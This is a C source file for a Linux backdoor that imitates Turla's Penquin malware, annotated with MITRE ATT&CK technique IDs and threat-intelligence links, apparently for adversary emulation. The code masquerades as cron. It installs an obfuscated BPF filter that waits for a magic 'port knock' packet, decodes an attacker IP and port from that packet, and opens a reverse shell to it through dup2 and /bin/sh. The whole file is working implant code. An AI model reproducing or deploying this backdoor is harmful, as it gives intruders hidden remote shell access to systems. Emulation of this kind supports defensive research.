/*
 * sniff.c:
 *      About:
 *          Initial Execution:
 *          1. Install filer - installs a BPF packet filter on eth0 interface. Listens for all incoming traffic. 
 *          2. Execute the system's cron utility as a child process
 *          Activation:
 *          1. eth0 recieves a Magic Packet.
 *          2. Unencodes payload (IP address & port)
 *          3. Executes a reverse shell to the IP address & port located in the payload
 *      MITRE ATT&CK Tecnhiques:
 *          T1027 : Obfuscated Files or Information
 *          T1036.004: Masquerading: Masquerade Task or Service
 *          T1059.004: Command and Scripting Interpreter: Unix Shell
 *          T1205.002 : Traffic Signaling: Socket Filters
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, injection was performed.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 *          https://securelist.com/the-penquin-turla-2/67962/
 *          https://lab52.io/blog/looking-for-penquins-in-the-wild/
 *          https://cn.ahnlab.com/global/upload/download/asecreport/ahnlab_zh_202006%20vol.91.pdf
*/
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <pcap.h>
//sockets
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
//htons
#include <arpa/inet.h>
//dup & execl functions
#include <unistd.h>
//child processes
#include <sys/wait.h>
//added for packetmanagement 
#include <assert.h>
//macro cipher
#include "crypt.h"

/* Start Base64 encode/decoding */
static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

void build_decoding_table() {

    decoding_table = malloc(256);

    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}
// memory management for the base64 decoding table. 
void base64_cleanup() {
    free(decoding_table);
} 
/*
 * base64_encode() & base64_decode():
 *      About:
 *          Accepts a char array pointer and performs encoding/decoding base64 functions on the data.
 *          Paramter(s): (unsigned char) data - a pointer to the data, (size_t) input_length - the length of the data, (size_t) the length of the returned base64 encoded data

 *      MITRE ATT&CK Tecnhiques:
 *          T1132.001 : Data Encoding: Standard Encoding
 *      Result:
 *      	Returns encoded or decoded char pointer if successful, returns a -1 if not.
 *          If successful, the data in memory for the char array pointer is encoded or decoded.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 */
char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = malloc(*output_length);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}

unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}
/* End Base64 encode/decode*/

/*Concatenate strings*/
char * concatStrings(   const char *a, 
                        const char *b,
                        const char *c,
                        const char *d,
                        const char *e,
                        const char *f
    ){
        size_t len = strlen(a) + 
                    strlen(b) + 
                    strlen(c) + 
                    strlen(d) +     
                    strlen(e) + 
                    strlen(f);
        // printf("\nconcat strings(): worked up to here\n");

        char* str = malloc(len + 1);
        strcpy(str, a);
        strcat(str, b);
        strcat(str, c); 
        strcat(str, d);
        strcat(str, e);
        strcat(str, f);
        return str;
}
/*
 * execute_realcron:
 *      About:
 *          Executes the host's cron as a child process
 *      MITRE ATT&CK Tecnhiques:
 *          T1027 : Obfuscated Files or Information
 *          T1036.004: Masquerading: Masquerade Task or Service
 *      Result:
 *      	Returns 0 if successful, returns a -1 if not.
 *          If successful, the host's cron was executed.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 */
int execute_realcron(){
    // MITRE ATT&CK Techniques:
    // T1027: Obfuscated Files or Information
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Obfuscate strings
    char cmd[] = __ENCRYPT64("/usr/sbin/cron -f");
    int result = system(__DECRYPT64(cmd));
	return result;
}
/*
 * my_packet_handler():
 *      About:
 *          Manages packet inspection for matching packets meeting the filter criteria. 
 *          Verifies header type, looking for IP Headers, calculates the beginning of the payload section.
 *          Decodes the payload, pulls out the IP Address and Port inside the packets payload section.
 *          Activates a reverse shell using the IP Address and Port.
 *      MITRE ATT&CK Tecnhiques:
 *          T1027 : Obfuscated Files or Information
 *          T1059.004: Command and Scripting Interpreter: Unix Shell
 *      Result:
 *      	Returns 0 if successful, returns a -1 if not.
 *          If successful, the resverse shell was executed.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 */
void my_packet_handler(
    u_char *args,
    const struct pcap_pkthdr *header,
    const u_char *packet
)
{
    /* First, lets make sure we have an IP packet */
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    if (ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        return;
    }

    /* Pointers to start point of various headers */
    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;

    /* Header lengths in bytes */
    int ethernet_header_length = 14; /* Doesn't change */
    int ip_header_length;
    int tcp_header_length;
    int payload_length;


    ip_header = packet + ethernet_header_length;

    ip_header_length = ((*ip_header) & 0x0F);

    ip_header_length = ip_header_length * 4;

    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) {
        return;
    }

    tcp_header = packet + ethernet_header_length + ip_header_length;
   
    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;
    
    tcp_header_length = tcp_header_length * 4;

    int total_headers_size = ethernet_header_length+ip_header_length+tcp_header_length;
    payload_length = header->caplen -
        (ethernet_header_length + ip_header_length + tcp_header_length);
    payload = packet + total_headers_size;

    /*Packet Triggers
    Trigger 1
    'i love unicorns!', # 69206c6f 76652075 6e69636f 726e7321
    'i love gnarwalls', # 69206c6f 76652067 6e617277 616c6c73
    */
    int trigger_1_byte_count = 0;
    int trigger_1_size = 16;
    int encoded_payload_byte_count = 0;
    int encoded_payload_size = 88;

    // first value used to trigger "port knock"
    unsigned char trigger_1_data[16] = "";
    // array holding b64 encoded payload
    unsigned char encoded_payload_data[100] = "";
    
    // Temorarary storage for port type conversion
    char* C2_PORT_CHAR;
    char *C2_PORT_PTR;
    long C2_PORT_long;
    char* C2_ADDRESS_Array;
     
    if (payload_length > 0) 
    {
        const unsigned char *temp_pointer = payload;
        const unsigned char *trigger_1_temp = payload;

        // Get the first trigger in the payload
        while (trigger_1_byte_count++ < trigger_1_size) 
        {
            trigger_1_data[trigger_1_byte_count - 1] = *trigger_1_temp;
            trigger_1_temp++;
        }
        // Get the base64 encoded payload data
        while (encoded_payload_byte_count++ < encoded_payload_size) 
        {
            encoded_payload_data[encoded_payload_byte_count - 1] = *trigger_1_temp;
            trigger_1_temp++;
        }

        // base64 decode the payload data
        long decode_size;
        decode_size = strlen(encoded_payload_data);
        char * decoded_data = base64_decode(encoded_payload_data, decode_size, &decode_size);

        // move decoded data to new char array
        char temp=1;  
        //int  i,j,k=0,n;
        char char_payload[100] = "";
        int decoded_byte_count = 0;

        //remove the character padding from the payload
        char pad_character = 'a';
        decoded_byte_count = 0;
        while (decoded_byte_count++ < decode_size) 
        {
            if (*decoded_data == pad_character) 
            {
                break;
            } 
            else 
            {
                char_payload[decoded_byte_count - 1] = *decoded_data;
            }
            decoded_data++;

        }

        // splitting the payload data and putting into appropriate variables
        char* token = strtok(char_payload, ":");
        int token_counter = 0;

        while (token != NULL)
        {
            if (token_counter == 1) 
            {
                C2_ADDRESS_Array = token;
                token = strtok(NULL, ":");
            } 
            else if (token_counter == 2) 
            {
                C2_PORT_CHAR = token;
                break;
            }
            token_counter++;
        }
        //convert to long type
        C2_PORT_long = strtoul(C2_PORT_CHAR, &C2_PORT_PTR, 10);
    }
    /*
    * my_packet_handler:
    *      About:
    *          Manages packet inspection for matching packets meeting the filter criteria. 
    *          Verifies header type, looking for IP Headers, calculates the beginning of the payload section.
    *          Decodes the payload, pulls out the IP Address and Port inside the packets payload section.
    *          Activates a reverse shell using the IP Address and Port.
    *      MITRE ATT&CK Tecnhiques:
    *          T1027 : Obfuscated Files or Information
    *          T1036.004: Masquerading: Masquerade Task or Service
    *      Result:
    *      	Returns 0 if successful, returns a -1 if not.
    *          If successful, the host's cron was executed.
    *      CTI:
    *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    */
    // socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    /*A struct is needed to pass in the connect() function.
    Struct needs: family, port and address
    */
    struct sockaddr_in sock_addr;
    sock_addr.sin_family = AF_INET;
    //sock addr.sin_port might throw issues between big and little indian. Using htons() should automatically convert from big indian to little indian if needed
    sock_addr.sin_port = htons(C2_PORT_long);
    //sock_addr.sin_addr.s_adder expects long type, inet_addr() converts from string to long type
    sock_addr.sin_addr.s_addr = inet_addr(C2_ADDRESS_Array);

    //connect() - expects a struct sockaddr, must typecase since we have a sockaddr_in
    connect(sock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr_in));


    //dup2 stdin - duplicate file descriptiors
    dup2(sock, STDIN_FILENO);
    //dup2 stdout
    dup2(sock, STDOUT_FILENO);
    //dup2 stderr
    dup2(sock, STDERR_FILENO);

    
    // MITRE ATT&CK Techniques:
    // T1027: Obfuscated Files or Information
    // T1059.004: Command and Scripting Interpreter: Unix Shell
	// References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
	// Obfuscate strings
    /*
    Arguments:
    /bin/sh = use bourne shell
    -c = read commands from the command_string operand, if -c is not declared, -s is the default value
    (char*)NULL = throws WARNING if a third argument is not present (even if it is NULL)
    */
    execl("/bin/sh", "-c", (char*)NULL);

    return;
}
/*
 * install_filter():
 *      About:
 *          Deobfuscates a filter expression and installs a BPF filter to the eth0 ethernet interface.
 *          Filter runs in the background and waits for a matching packet to be recieved by the eth0 ethernet interface.
 *      MITRE ATT&CK Tecnhiques:
 *          T1027 : Obfuscated Files or Information
 *          T1205.002 : Traffic Signaling: Socket Filters
 *      Result:
 *      	Returns 0 if successful, returns a -1 if not.
 *          If successful, the a sniffer is installed on the eth0 ethernet interface.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf
 *          https://lab52.io/blog/looking-for-penquins-in-the-wild/
 *          https://securelist.com/the-penquin-turla-2/67962/
 */

int install_filter() {    
    char device[] = "eth0";
    char error_buffer[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program filter;
    // MITRE ATT&CK Techniques:
    // T1027: Obfuscated Files or Information
	  // References: 
      // https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
	  // Obfuscate strings
    /*Filter expression*/
    char filter_exp0[] = __ENCRYPT64("tcp and (tcp[20:4]=0x69206c6f) and (tcp[24:2]=0x7665) and (tcp\0");
    char filter_exp1[] = __ENCRYPT64("[26:1]=0x20) and (tcp[27:1]=0x75 or tcp[27:1]=0x67) and (tcp[2\0");
    char filter_exp2[] = __ENCRYPT64("8:4]=0x6e69636f or tcp[28:4]=0x6e617277) and (tcp[32:4]=0x726e\0");
    char filter_exp3[] = __ENCRYPT64("7321 or tcp[32:4]=0x616c6c73) and (tcp[124:4]=0x6d616769 or tc\0");
    char filter_exp4[] = __ENCRYPT64("p[124:4]=0x6d797468) and (tcp[128:4]=0x63616c21 or tcp[128:4]=\0");
    char filter_exp5[] = __ENCRYPT64("0x6963616c)\0");

    /*Decrypt the filter expression*/
    char* filter_exp = concatStrings(
        __DECRYPT64(filter_exp0),
        __DECRYPT64(filter_exp1),
        __DECRYPT64(filter_exp2),
        __DECRYPT64(filter_exp3),
        __DECRYPT64(filter_exp4),
        __DECRYPT64(filter_exp5));

    /* Snapshot length is how many bytes to capture from each packet*/
    int snapshot_length = 65535;
    /* End the loop after this many packets are captured */
    int total_packet_count = 1;
    u_char *my_arguments = NULL;

    /* Get a working sniffing session aka open device for sniffing in promiscuous mode 
    1st argument:Adapter device - (pcap_lookupdev) adapter to listen on
    2nd argument:int snapshot_length - maximum number of bytes to be captured by pcap
    3rd argument:bool 1 - promiscuous mode - sniffs all traffic on the wire if set to true
    4th argument:int 1000 - packet buffer time out in milliseconds, a value of 0 means no time out
    5th argument:string error_buffer - store error messages
    */
    handle = pcap_open_live(device, snapshot_length, 0, 10, error_buffer);
     if (handle == NULL) {
        return 2;
    }

    /* Translate the filter into a sniffer program AKA optimize/translate to a BPF packet filtering program
    1st argument:pcap_t handle - pcap handle
    2nd argument:struct bpf_program filter - pointer to the filter's buffer
    3rd argument:const char *str filter_exp - filter in human-readable form
    4th argument:int 1 - enable optimization for underling BPF functions yes (1) or no (0)
    5th argument:bpf_u_int32 PCAP_NETMASK_UNKNOWN - IPv4 netmask - the PCAP_NETMASK_UNKNOWN value can capture on the Linux "any" pseudo-interface and still capture if the program's network interface unknown.
    */
    if (pcap_compile(handle, &filter, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        return 2;
    }
    /* This applies the filter*/
    if (pcap_setfilter(handle, &filter) == -1) {
        return 2;
    }
    pcap_freecode(&filter);
    /*Capture packets 
    Use a loop for callback function (my_packet_handler).
    1st argument:pcap_t handle - pcap handle
    2nd argument:int total_packet_count - number of packets to process before returning
    3rd argument:pcap_handler my_packet_handler - handler routine 
    4th argument:const u_char my_arguments - data passed to the handler (currently NULL)
    */
    pcap_loop(handle, total_packet_count, my_packet_handler, my_arguments);
    return 0;
}
/*
 * main:
 *      About:
 *          Forks the programs process. 
 *          Cron, the system's utility, is executed with as a Child process using execute_realcron().
 *          The parent process installs a BPF filter using install_filter() function.        
 *      MITRE ATT&CK Tecnhiques:
 *          T1027 : Obfuscated Files or Information
 *          T1036.004: Masquerading: Masquerade Task or Service
 *      Result:
 *      	Returns 0 if successful, returns am error number or EXIT_Failure if not.
 *          If successful, cron is exeucted and a BPF filter is installed. 
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 */
int main(){

    pid_t pid;
    int status;
    int result = 0;
    pid = fork();
    
    if (pid == -1){
        exit(EXIT_FAILURE);
    }
    // 0 means child process created
    if (pid == 0){
    /* Executes the system's cron as a child process*/
       result = execute_realcron();
       if (result == -1){
        return(errno);
       }
    }
    /*set the group session ID by making this the leader*/
    else if (pid !=0){
        setsid();
        result = install_filter();
        if (result == -1){
            return(errno);
        }
        exit(0);
    }

    while ((pid = wait(&status)) > 0);
     exit(0);
}
